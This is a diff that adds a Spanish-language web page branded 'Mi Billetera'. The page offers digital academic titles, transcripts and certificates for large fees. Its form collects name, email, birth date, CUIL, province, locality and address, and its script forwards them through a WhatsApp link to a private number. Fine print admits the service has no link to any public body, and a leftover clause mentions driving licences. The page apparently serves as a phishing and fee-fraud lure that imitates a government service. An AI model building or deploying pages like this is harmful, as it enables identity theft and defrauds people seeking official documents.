@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Certificados Académicos Digitales | Mi Billetera</title>
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Encode+Sans:wght@100;200;300;400;500;600;700;800;900&display=swap">
+
+<style>
+body{
+  font-family:'Encode Sans',sans-serif;
+  margin:0;
+}
+
+.navbar{
+  background:#fff;
+  border-bottom:3px solid #ffd100;
+  padding:10px 20px;
+}
+
+.navbar img{
+  height:70px;
+}
+
+.header{
+  background:#0072bb;
+  color:#fff;
+  padding:30px;
+}
+
+.container{
+  max-width:900px;
+  margin:auto;
+  padding:20px;
+}
+
+.btn-licencia{
+  background:#0072bb;
+  color:#fff;
+  border:none;
+  border-radius:25px;
+  padding:12px 30px;
+  font-weight:600;
+  text-transform:uppercase;
+  cursor:pointer;
+  text-decoration:none;
+  display:inline-block;
+}
+
+.btn-licencia:disabled{
+  background:#999;
+  cursor:not-allowed;
+}
+
+input,select{
+  width:100%;
+  padding:10px;
+  margin-bottom:8px;
+  border-radius:8px;
+  border:1px solid #ccc;
+  box-sizing:border-box;
+}
+
+.error{
+  color:red;
+  font-size:13px;
+  display:none;
+  margin-bottom:10px;
+}
+
+.titulo-licencia{
+  text-align:center;
+  font-size:18px;
+  font-weight:700;
+  color:#0072bb;
+  margin:25px 0 10px;
+}
+
+.img-licencia{
+  width:100%;
+  border-radius:14px;
+}
+
+.aclaracion{
+  background:#f5f5f5;
+  padding:15px;
+  border-radius:10px;
+  margin-top:15px;
+  font-size:14px;
+  line-height:1.5;
+}
+
+/* MODAL */
+.modal-bg{
+  position:fixed;
+  top:0;
+  left:0;
+  width:100%;
+  height:100%;
+  background:rgba(0,0,0,.65);
+  display:none;
+  justify-content:center;
+  align-items:center;
+  z-index:9999;
+  padding:15px;
+  box-sizing:border-box;
+}
+
+.modal-box{
+  background:#fff;
+  width:100%;
+  max-width:700px;
+  max-height:90vh;
+  overflow-y:auto;
+  border-radius:16px;
+  padding:25px;
+}
+
+.modal-box h2{
+  margin-top:0;
+  color:#0072bb;
+}
+
+.modal-texto{
+  background:#f8f8f8;
+  padding:15px;
+  border-radius:10px;
+  font-size:14px;
+  line-height:1.6;
+}
+
+.modal-btns{
+  display:flex;
+  gap:10px;
+  flex-wrap:wrap;
+  margin-top:15px;
+}
+
+.btn-cancelar{
+  background:#999;
+  color:#fff;
+  border:none;
+  border-radius:25px;
+  padding:12px 20px;
+  cursor:pointer;
+}
+
+.check-box{
+  margin-top:15px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="navbar">
+<img src="https://i.postimg.cc/638qB6NY/1776094869296.png">
+</div>
+
+<div class="header">
+<h1>Certificados académicos digitales</h1>
+<p>La emisión y gestión de documentación educativa ya está disponible en Mi Billetera.</p>
+</div>
+
+<div class="container">
+
+<h2>Nueva gestión de documentación académica digital</h2>
+<p>Ahora podrá solicitar títulos, analíticos y constancias en formato digital de manera rápida y segura.</p>
+
+<div class="titulo-licencia">ANALÍTICO DISPONIBLE</div>
+<img src="https://i.postimg.cc/d1gJtjjT/Screenshot-20260421-171002-Docs.jpg" class="img-licencia">
+
+<div class="titulo-licencia">TÍTULO DISPONIBLE</div>
+<img src="https://i.postimg.cc/gcCW31Ks/Screenshot-20260421-154805-Docs.jpg" class="img-licencia">
+
+<div style="text-align:center; margin-top:20px;">
+<a href="#" class="btn-licencia">Ver documentación digital</a>
+</div>
+
+<h2>Formulario de inicio de trámite</h2>
+
+<select id="tramite" onchange="mostrarCampos(); validarFormulario();">
+<option value="">Seleccionar trámite</option>
+<option value="analitico">Solicitud de Analítico $180.000</option>
+<option value="titulo">Solicitud de Título $250.000</option>
+<option value="constancia">Constancia de estudios $120.000</option>
+<option value="legalizacion">Legalización de documentación $160.000</option>
+</select>
+
+<form id="formulario" style="display:none;" oninput="validarFormulario()" onsubmit="abrirModal(event)">
+
+<input type="text" id="nombre" placeholder="Nombre" required>
+<input type="text" id="apellido" placeholder="Apellido" required>
+
+<input type="email" id="email" placeholder="Correo electrónico" required>
+<div class="error" id="errorEmail">Email inválido</div>
+
+<input type="text" id="fecha" placeholder="Fecha de nacimiento" required>
+
+<input type="text" id="cuil" placeholder="CUIL" required>
+<div class="error" id="errorCuil">CUIL inválido</div>
+
+<input type="text" id="provincia" placeholder="Provincia" required>
+<input type="text" id="localidad" placeholder="Localidad" required>
+<input type="text" id="direccion" placeholder="Dirección" required>
+
+<select id="categoria">
+<option value="">Seleccionar nivel educativo</option>
+<option>Primario</option>
+<option>Secundario</option>
+<option>Terciario</option>
+<option>Universitario</option>
+<option>Posgrado</option>
+</select>
+
+<div class="aclaracion">
+<strong>Aclaración:</strong><br><br>
+En algunos casos podrá solicitarse fotografía tipo DNI para validar identidad.<br><br>
+El pago se realiza una vez finalizado el trámite.
+</div>
+
+<button id="btnEnviar" class="btn-licencia" disabled>
+Enviar solicitud
+</button>
+
+</form>
+
+</div>
+
+<footer style="background:#f5f5f5; padding:30px; margin-top:40px;">
+<div class="container" style="text-align:center;">
+<p><strong>miBilletera | Documentación Digital</strong></p>
+<p>Gestión y visualización de documentación digital.</p>
+<p style="font-size:12px;color:#666;">© 2026 miBilletera</p>
+</div>
+</footer>
+
+<!-- MODAL -->
+<div class="modal-bg" id="modalTerminos">
+<div class="modal-box">
+
+<h2>Términos y Condiciones</h2>
+
+<div class="modal-texto">
+
+<strong>Términos y Condiciones – Política de Privacidad</strong>
+
+<br><br>
+
+Esta plataforma brinda asistencia privada de carácter administrativo y digital para la carga, organización, envío y seguimiento de solicitudes vinculadas a documentación personal, educativa o administrativa.
+
+<br><br>
+
+El servicio es independiente y no pertenece, representa ni mantiene relación institucional con organismos públicos, ministerios, municipios, universidades ni entidades estatales.
+
+<br><br>
+
+La plataforma actúa únicamente como intermediario técnico y administrativo. No emite documentos oficiales por cuenta propia ni tiene facultades para aprobar, rechazar, validar o modificar registros oficiales.
+
+<br><br>
+
+Toda resolución final depende exclusivamente del organismo, institución o entidad competente.
+
+<br><br>
+
+El usuario declara que toda información, documentación, imágenes o datos aportados son verdaderos, actuales y legítimos, asumiendo responsabilidad total por errores u omisiones.
+
+<br><br>
+
+No se garantizan resultados, aprobaciones, emisión, tiempos de entrega, aceptación institucional ni resoluciones favorables.
+
+<br><br>
+
+Los importes informados corresponden a honorarios administrativos y operativos del servicio privado, salvo indicación expresa en contrario.
+
+<br><br>
+
+La plataforma no será responsable por demoras externas, rechazos institucionales, caídas de sistemas ajenos, cambios normativos, errores del usuario o daños derivados del uso del servicio.
+
+<br><br>
+
+Toda gestión relacionada con licencias, registros vehiculares o documentación de conducir queda sujeta exclusivamente a la normativa vigente y aprobación del organismo competente.
+
+<br><br>
+
+Toda gestión vinculada a certificados analíticos, constancias, títulos o documentación académica depende exclusivamente de la institución educativa emisora o autoridad competente.
+
+<br><br>
+
+La plataforma no fabrica, altera ni crea documentos oficiales o académicos.
+
+<br><br>
+
+Los datos personales suministrados serán utilizados únicamente para contacto, gestión solicitada, seguimiento administrativo y comunicación operativa del servicio.
+
+<br><br>
+
+No se comercializan datos personales con terceros ajenos al servicio.
+
+<br><br>
+
+Al utilizar esta plataforma, enviar formularios o presionar “Aceptar y Enviar”, el usuario declara haber leído, comprendido y aceptado íntegramente estos términos y condiciones.
+
+<br><br>
+
+Esta plataforma no promueve ni participa en falsificación documental, evasión de controles, suplantación de identidad, alteración de registros públicos ni actividades ilegales de ningún tipo.
+
+</div>
+
+<div class="check-box">
+<label>
+<input type="checkbox" id="aceptoTerminos">
+He leído y acepto los términos y condiciones
+</label>
+</div>
+
+<div class="modal-btns">
+<button type="button" class="btn-cancelar" onclick="cerrarModal()">Cancelar</button>
+<button type="button" class="btn-licencia" onclick="confirmarEnvio()">Aceptar y Enviar</button>
+</div>
+
+</div>
+</div>
+
+<script>
+function mostrarCampos(){
+  document.getElementById("formulario").style.display="block";
+}
+
+document.getElementById("cuil").addEventListener("input",function(e){
+  let valor=e.target.value.replace(/\D/g,"").substring(0,11);
+
+  if(valor.length>2 && valor.length<=10){
+    valor=valor.slice(0,2)+"-"+valor.slice(2);
+  }else if(valor.length>10){
+    valor=valor.slice(0,2)+"-"+valor.slice(2,10)+"-"+valor.slice(10);
+  }
+
+  e.target.value=valor;
+});
+
+function validarCUIL(cuil){
+  return /^\d{2}-\d{8}-\d{1}$/.test(cuil);
+}
+
+function validarEmail(email){
+  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+}
+
+function validarFormulario(){
+
+  let valido =
+  nombre.value &&
+  apellido.value &&
+  validarEmail(email.value) &&
+  fecha.value &&
+  validarCUIL(cuil.value) &&
+  provincia.value &&
+  localidad.value &&
+  direccion.value &&
+  tramite.value &&
+  categoria.value;
+
+  errorEmail.style.display =
+    email.value && !validarEmail(email.value) ? "block":"none";
+
+  errorCuil.style.display =
+    cuil.value && !validarCUIL(cuil.value) ? "block":"none";
+
+  btnEnviar.disabled=!valido;
+}
+
+function abrirModal(e){
+  e.preventDefault();
+  document.getElementById("modalTerminos").style.display="flex";
+}
+
+function cerrarModal(){
+  document.getElementById("modalTerminos").style.display="none";
+}
+
+function confirmarEnvio(){
+
+  if(!document.getElementById("aceptoTerminos").checked){
+    alert("Debe aceptar los términos.");
+    return;
+  }
+
+  cerrarModal();
+  enviarWhatsApp();
+}
+
+function enviarWhatsApp(){
+
+  let tipoTexto = tramite.options[tramite.selectedIndex].text;
+
+  let mensaje =
+`*SOLICITUD DE DOCUMENTACIÓN ACADÉMICA*
+
+📌 Trámite: ${tipoTexto}
+
+👤 Nombre: ${nombre.value}
+👤 Apellido: ${apellido.value}
+📧 Email: ${email.value}
+🎂 Fecha: ${fecha.value}
+🆔 CUIL: ${cuil.value}
+📍 Provincia: ${provincia.value}
+🏙️ Localidad: ${localidad.value}
+🏠 Dirección: ${direccion.value}
+🎓 Nivel: ${categoria.value}`;
+
+  let url="https://wa.me/5491131602393?text="+encodeURIComponent(mensaje);
+
+  window.open(url,"_blank");
+}
+</script>
+
+</body>
+  </html>
